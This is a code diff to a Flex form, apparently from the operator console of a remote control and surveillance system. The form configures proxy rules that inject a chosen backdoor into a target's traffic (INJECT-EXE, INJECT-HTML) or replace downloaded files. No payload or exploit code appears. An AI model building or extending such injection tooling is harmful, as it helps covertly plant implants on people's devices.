@@ -12,8 +12,6 @@
   
   <fx:Script>
     <![CDATA[
-      import com.adobe.serialization.json.JSON;
-      
       import it.ht.rcs.console.network.model.Proxy;
       import it.ht.rcs.console.network.model.ProxyRule;
       
@@ -24,6 +22,7 @@
       
       [Bindable]
       public var rule:ProxyRule;
+      
       public var proxy:it.ht.rcs.console.network.model.Proxy;
       
       public var mode:String = 'edit';
@@ -33,54 +32,108 @@
       
       public function init():void
       {
-        rule = rule ? rule : new ProxyRule(ProxyRule.defaultProxyRule());
-        probability.value = rule.probability;
-        ident.selectedItem = rule.ident;
-        action.selectedItem = rule.action;
-        if (rule.action == 'REPLACE') {
-          currentState = 'fileSelected';
-          fileName.text = rule.action_param_name;
-        } else {
-//          for each (var bd:Object in backdoors.dataProvider)
-//          if (bd._id == rule.action_param) {
-//            backdoors.selectedItem = bd;
-//            break;
-//          }
+        
+        if (mode == 'create') {
+          
+          rule = new ProxyRule(ProxyRule.defaultProxyRule());
+          
+        } else if (mode == 'edit') {
+          
+          ident.selectedItem = rule.ident;
+          action.selectedItem = rule.action;
+          
+          if (rule.target_id && rule.target_id.length == 1 && rule.target_id[0])
+          for each (var t:Object in target.dataProvider) {
+            if (t.separator) continue;
+            if (t._id == rule.target_id[0]) {
+              target.selectedItem = t;
+              break;
+            }
+          }
+          
+          if (rule.action == 'REPLACE') {
+            
+            currentState = 'fileSelected';
+            fileName.text = rule.action_param_name;
+            
+          } else {
+            
+            for each (var b:Object in backdoor.dataProvider) {
+              if (b._id == rule.action_param) {
+                backdoor.selectedItem = b;
+                break;
+              }
+            }
+            
+          }
+        
         }
+        
       }
       
       private function save():void
       {
+
+        if (hasValidationErrors())
+          return;
         
-        if (action.selectedItem !== replace) {
+        if (action.selectedItem != 'REPLACE')
           manageInject();
-        } else {
-//          if (mode == 'create' && fileReference == null) {
-//            AlertPopUp.show('please choose a file');
-//            return;
-//          }
-          if (fileChanged)
-            manageReplaceWithUpload();
-          else
-            manageReplace();
+        
+        else if (fileChanged)
+          manageReplaceWithUpload();
+        
+        else
+          manageReplace();
+      }
+      
+      private function hasValidationErrors():Boolean
+      {
+        var hasError:Boolean = false;
+        
+        target.errorString = '';
+        if (!target.selectedItem) {
+          target.errorString = 'Please select a target';
+          hasError = true;
         }
         
+        backdoor.errorString = '';
+        if (action.selectedItem != 'REPLACE' && !backdoor.selectedItem) {
+          backdoor.errorString = 'Please select a backdoor';
+          hasError = true;
+        }
+        
+        return hasError;
+      }
+      
+      private function populateCommonProperties():void
+      {
+        rule.enabled = isEnabled.selected;
+        rule.disable_sync = sync.selected;
+        rule.probability = probability.value;
+        rule.ident = ident.selectedItem;
+        rule.ident_param = ident_param.text;
+        rule.resource = resource.text;
+        rule.action = action.selectedItem;
+        
+        if (mode == 'create' || target.selectedItem._id != rule.target_id[0])
+          rule.target_id = [target.selectedItem._id];
       }
       
       private function manageInject():void
       {
         populateCommonProperties();
-        rule.target_id = [target.selectedItem._id];
-        rule.action_param = backdoors.selectedItem ? backdoors.selectedItem._id : null;
+        rule.action_param = backdoor.selectedItem ? backdoor.selectedItem._id : null;
+        rule.action_param_name = backdoor.selectedItem ? backdoor.selectedItem.label : null;
         
-        proxy.rulesManager.addRule(proxy._id, rule, function(rule:ProxyRule):void {close();});
+        saveRule();
       }
       
       private function manageReplace():void
       {
         populateCommonProperties();
         
-        proxy.rulesManager.addRule(proxy._id, rule, function(rule:ProxyRule):void {close();});
+        saveRule();
       }
       
       private var uploadPopup:UploadPopup;
@@ -96,34 +149,21 @@
         PopUpManager.centerPopUp(uploadPopup);
       }
       
-      private function onUploadError(event:Event):void
-      {
-        PopUpManager.removePopUp(uploadPopup);
-        Alert.show(event.type);
-      }
-      
       private function onUploadComplete(event:DataEvent):void
       {
         PopUpManager.removePopUp(uploadPopup);
+        
         populateCommonProperties();
         rule.action_param = event.data;
         rule.action_param_name = fileReference.name;
 
-        proxy.rulesManager.addRule(proxy._id, rule, function(rule:ProxyRule):void {close();});
+        saveRule();
       }
       
-
-      
-      private function populateCommonProperties():void
+      private function onUploadError(event:Event):void
       {
-        rule.enabled = isEnabled.selected;
-        rule.disable_sync = sync.selected;
-        rule.probability = probability.value;
-        rule.target_id = [target.selectedItem._id];
-        rule.ident = ident.selectedItem;
-        rule.ident_param = ident_param.text;
-        rule.resource = resource.text;
-        rule.action = action.selectedItem;
+        PopUpManager.removePopUp(uploadPopup);
+        Alert.show(event.type);
       }
       
       private function browse():void
@@ -140,19 +180,27 @@
         fileChanged = true;
       }
       
+      private function saveRule():void
+      {
+        if (mode == 'create')
+          proxy.rulesManager.addRule(proxy._id, rule, function(rule:ProxyRule):void { close(); });
+        else
+          close();
+      }
+      
     ]]>
   </fx:Script>
   
   <fx:Declarations>
     <s:ArrayCollection id="dataProvider">
       
-      <fx:Object label="Target 1" type="target" _id="4e314a052afb65157900005a"/>
+      <fx:Object label="Target 1" _id="4e314a052afb65157900005a" type="target"/>
       <fx:Object label="Backdoor 1" type="backdoor"/>
       <fx:Object label="Evidence 1" type="evidence"/>
       <fx:Object label="Operation 1" type="operation"/>
       
       <fx:Object label="Target 2" type="target"/>
-      <fx:Object label="Backdoor 2" type="backdoor"/>
+      <fx:Object label="Backdoor 2" _id="RCS_0002" type="backdoor"/>
       <fx:Object label="Evidence 2" type="evidence"/>
       <fx:Object label="Operation 2" type="operation"/>
       
@@ -189,7 +237,7 @@
     <s:State name="fileSelected"/>
   </utils:states>
   
-  <s:Form left="5" right="5" bottom="15" skinClass="it.ht.rcs.console.skins.CompactForm">
+  <s:Form left="5" right="5" bottom="15" skinClass="it.ht.rcs.console.skins.CompactForm" id="ruleForm">
     
     <s:FormItem label="{R.get('ENABLED')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
       <s:CheckBox id="isEnabled" selected="{rule.enabled}"/>
@@ -200,12 +248,8 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('PROBABILITY')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <s:HSlider id="probability" width="200" maximum="100" minimum="0" snapInterval="1" stepSize="1" value="50"/>
+      <s:HSlider id="probability" width="200" maximum="100" minimum="0" snapInterval="1" stepSize="1" value="{rule.probability}"/>
     </s:FormItem>
-    
-    <!--s:FormItem label="{R.get('TARGET')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <s:DropDownList id="target" width="200"></s:DropDownList>
-    </s:FormItem-->
     
     <s:FormItem label="{R.get('TARGET')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
       <items:SearchField id="target" width="200" dataProvider="{dataProvider}" types="{['target']}"></items:SearchField>
@@ -241,27 +285,32 @@
       <s:DropDownList id="action" width="200" change="{currentState = 'normal'}" requireSelection="true">
          <s:dataProvider>
            <s:ArrayCollection>
-             <fx:String id="injectExe">INJECT-EXE</fx:String>
-             <fx:String id="injectHtml">INJECT-HTML</fx:String>
-             <fx:String id="replace">REPLACE</fx:String>
+             <fx:String>INJECT-EXE</fx:String>
+             <fx:String>INJECT-HTML</fx:String>
+             <fx:String>REPLACE</fx:String>
            </s:ArrayCollection>
          </s:dataProvider>
        </s:DropDownList>
     </s:FormItem>
     
+    
+    
     <s:FormItem label="{R.get('BACKDOOR')}" skinClass="it.ht.rcs.console.skins.CompactFormItem"
-                visible="{action.selectedItem !== replace}" includeInLayout="{action.selectedItem !== replace}">
-      <items:SearchField id="backdoors" width="200" dataProvider="{dataProvider}" types="{['backdoor']}"></items:SearchField>
+                visible="{action.selectedItem != 'REPLACE'}" includeInLayout="{action.selectedItem != 'REPLACE'}">
+      
+      <items:SearchField id="backdoor" width="200" dataProvider="{dataProvider}" types="{['backdoor']}"></items:SearchField>
+      
     </s:FormItem>
     
+    
+    
     <s:FormItem label="{R.get('FILE')}" skinClass="it.ht.rcs.console.skins.CompactFormItem"
-                visible="{action.selectedItem === replace}" includeInLayout="{action.selectedItem === replace}">
+                visible="{action.selectedItem == 'REPLACE'}" includeInLayout="{action.selectedItem == 'REPLACE'}">
       
       <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}" click="browse()"/>
       
       <s:Label id="fileName" includeIn="fileSelected" width="200" buttonMode="true" click="browse()"
-               maxDisplayedLines="1" paddingTop="8" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"
-               verticalAlign="middle"/>
+               maxDisplayedLines="1" paddingTop="8" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}" verticalAlign="middle"/>
       
     </s:FormItem>
     
